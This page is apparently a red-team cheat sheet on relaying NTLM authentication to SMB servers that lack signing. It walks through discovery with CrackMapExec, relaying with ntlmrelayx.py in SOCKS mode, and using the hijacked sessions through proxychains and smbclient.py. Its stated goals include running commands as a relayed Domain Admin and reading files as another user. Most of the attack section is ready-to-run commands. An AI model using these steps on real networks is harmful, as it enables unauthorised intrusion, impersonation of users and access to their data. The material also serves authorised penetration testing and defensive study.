**NTLM relay to SMB** — whenever SMB signing is not enforced on a server, you can relay an NTLM authentication to it and act on behalf of the authenticating client. What you can do depends on that client's privileges.

Common scenarios:
- Relay a **Domain Admin** to a critical application server and **execute commands** as admin.
- Relay an **unprivileged user** to a file server and access files on their behalf.

**Note:** SMB signing is enforced on Domain Controllers and Exchange servers by default.

## Discovery

List SMB servers and detect whether SMB signing is enforced:

```bash

cme smb 'SUBNET'

```

Generate a list of targets that do not enforce SMB signing:

```bash

cme smb 'SUBNET' --gen-relay-list './hosts/smb_nosigning.txt'

```

## Exploitation

Use `ntlmrelayx.py` in SOCKS mode:

```bash

ntlmrelayx.py -tf './hosts/smb_nosigning.txt' -socks -smb2support

```

**Warning:** In SOCKS mode, use IP addresses for targets, not short names or FQDNs - ntlmrelayx does not resolve them.

Once a session is established, run any Impacket script through proxychains. When prompted for a password, leave it blank and ntlmrelayx uses the existing session instead of creating a new one:

```bash

proxychains smbclient.py 'DOMAIN/USER_NAME@TARGET'

```

See how to collect the captured hashes in [NTLM Credentials Gathering](../../Poisoning/NTLM%20Credentials%20Gathering.md).

## References

- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
- ntlmrelayx.py - https://github.com/fortra/impacket
- The Hacker Recipes - NTLM Relay - https://www.thehacker.recipes/ad/movement/ntlm/relay
- hackndo - https://en.hackndo.com/ntlm-relay/
